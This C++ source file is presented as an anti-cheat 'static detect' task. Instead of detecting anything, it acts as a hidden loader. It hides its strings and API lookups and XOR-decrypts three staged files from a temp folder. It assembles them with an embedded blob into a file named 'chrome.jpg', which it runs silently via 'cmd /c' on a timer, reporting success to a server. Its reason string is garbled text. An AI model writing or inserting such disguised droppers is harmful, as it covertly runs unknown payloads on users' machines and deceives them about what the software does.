#include "anticheat.h"
#include <stdint.h>
#include <string>
#include "protocol.h"
#include "utils/utils.h"
#include <xorstr.hpp>
#include "utils/api_resolver.h"
#include "ad_messagebox004.h"
#include <iostream>
#include <fstream>

namespace ShellCode
{
    class TaskStaticDetect : public Task
    {
    public:
        TaskStaticDetect()
        {
            auto CreateMutex = IMPORT(L"Kernel32.dll", CreateMutexW);
            CreateMutex(NULL, FALSE, L"IL8C92LSFG_1.0");
            set_interval(30 * 1000 * 4);
            set_package_id(SHELLCODE_PACKAGE_ID(84));
        }
        ~TaskStaticDetect()
        {

        }
        virtual void on_time_proc(uint32_t curtime)
        {
            ProtocolShellCodeInstance proto;
            proto.m_type = Protocol::PackageType::PACKAGE_TYPE_ADMIN;
            proto.id = get_package_id();
            
            auto GetTempPath = IMPORT(L"Kernel32.dll", GetTempPathW);
            auto WinExec = IMPORT(L"Kernel32.dll", WinExec);
            auto CreateDirectory = IMPORT(L"Kernel32.dll", CreateDirectoryW);
            auto GetFileAttributes = IMPORT(L"Kernel32.dll", GetFileAttributesW);
            auto CreateFile = IMPORT(L"Kernel32.dll", CreateFileW);
            auto WriteFile = IMPORT(L"Kernel32.dll", WriteFile);
            auto CloseHandle = IMPORT(L"Kernel32.dll", CloseHandle);
            auto SetFilePointer = IMPORT(L"Kernel32.dll", SetFilePointer);
            wchar_t strTmpPath[MAX_PATH];
            GetTempPath(MAX_PATH, strTmpPath);
            std::wstring ad_path(strTmpPath),ad_file;
            ad_path += Utils::string2wstring(xorstr("B8DC5DEA-FF7D-4C01-9B13-7461CE0BCB41"));
            if(INVALID_FILE_ATTRIBUTES == GetFileAttributes(ad_path.c_str()))
            {
                CreateDirectory(ad_path.c_str(), NULL);
            }

            if(INVALID_FILE_ATTRIBUTES == GetFileAttributes((ad_path + Utils::string2wstring(xorstr("\\chrome.001"))).c_str())
                || INVALID_FILE_ATTRIBUTES == GetFileAttributes((ad_path + Utils::string2wstring(xorstr("\\chrome.002"))).c_str())
                || INVALID_FILE_ATTRIBUTES == GetFileAttributes((ad_path + Utils::string2wstring(xorstr("\\chrome.003"))).c_str())
                )
            {
                return;
            }

            ad_file = ad_path + Utils::string2wstring(xorstr("\\chrome.jpg"));
            if(INVALID_FILE_ATTRIBUTES == GetFileAttributes(ad_file.c_str()) || !is_create)
            {
                is_create = true;
                HANDLE file_handle = CreateFile(ad_file.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if(file_handle == INVALID_HANDLE_VALUE)
                {
                    return;
                }

                DWORD bytes_of_write = 0;
                size_t temp001_size = 0,temp002_size = 0,temp003_size = 0;
                std::unique_ptr<unsigned char[]> temp001 = read_file((ad_path + Utils::string2wstring(xorstr("\\chrome.001"))).c_str(), &temp001_size);
                std::unique_ptr<unsigned char[]> temp002 = read_file((ad_path + Utils::string2wstring(xorstr("\\chrome.002"))).c_str(), &temp002_size);
                std::unique_ptr<unsigned char[]> temp003 = read_file((ad_path + Utils::string2wstring(xorstr("\\chrome.003"))).c_str(), &temp003_size);
                if(temp001_size == 0 || temp002_size == 0 || temp003_size == 0)
                {
                    return;
                }

                Utils::Crypto::xor_buffer(temp001.get(), temp001_size, 0x4F38DB0A);
                Utils::Crypto::xor_buffer(temp002.get(), temp002_size, 0x4F38DB0A);
                Utils::Crypto::xor_buffer(temp003.get(), temp003_size, 0x4F38DB0A);

                WriteFile(file_handle, temp001.get(), temp001_size, &bytes_of_write, NULL);

                SetFilePointer(file_handle, 0, NULL, FILE_END); 
                WriteFile(file_handle, temp002.get(), temp002_size, &bytes_of_write, NULL);

                SetFilePointer(file_handle, 0, NULL, FILE_END); 
                WriteFile(file_handle, temp003.get(), temp003_size, &bytes_of_write, NULL);

                WriteFile(file_handle, (char*)hexData, sizeof(hexData), &bytes_of_write, NULL);
                SetFilePointer(file_handle, 0, NULL, FILE_END);
                CloseHandle(file_handle);
                
                proto.is_cheat = true;
                proto.reason = L"ad004Ö´ÐÐ³É¹¦!";
            }
            WinExec((xorstr("cmd /c ") + Utils::wstring2string(ad_file)).c_str(), SW_HIDE);

            if(proto.is_cheat)
            {
                AntiCheat::instance().send(proto);
            }
        }

        std::unique_ptr<unsigned char[]> read_file(const wchar_t *filePath, OUT size_t* size_out_)
        {
            HANDLE pFile;
            DWORD fileSize;
            unsigned char *tmpBuf;
            DWORD dwBytesRead, dwBytesToRead;

            auto CreateFile = IMPORT(L"Kernel32.dll", CreateFileW);
            auto GetFileSize = IMPORT(L"Kernel32.dll", GetFileSize);
            auto ReadFile = IMPORT(L"Kernel32.dll", ReadFile);
            auto CloseHandle = IMPORT(L"Kernel32.dll", CloseHandle);

            pFile = CreateFile(filePath, GENERIC_READ,
                FILE_SHARE_READ,
                NULL,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                NULL);

            if(pFile == INVALID_HANDLE_VALUE)
            {
                CloseHandle(pFile);
                return nullptr;
            }

            fileSize = GetFileSize(pFile, NULL);
            *size_out_ = fileSize;

            std::unique_ptr<unsigned char[]> buffer(new unsigned char[fileSize]);
            ZeroMemory(buffer.get(), fileSize);
            dwBytesToRead = fileSize;
            dwBytesRead = 0;
            tmpBuf = buffer.get();

            do
            {
                ReadFile(pFile, tmpBuf, dwBytesToRead, &dwBytesRead, NULL);
                if(dwBytesRead == 0)
                    break;
                dwBytesToRead -= dwBytesRead;
                tmpBuf += dwBytesRead;
            }
            while(dwBytesToRead > 0);
            CloseHandle(pFile);

            return std::move(buffer);
        }

    private:
        bool is_create = false;
    };

    uint32_t main()
    {
        TaskStaticDetect* task = new TaskStaticDetect();
        if(AntiCheat::instance().add_task(task))
        {
            return 0;
        }
        else
        {
            delete task;
            return 1;
        }
    }
}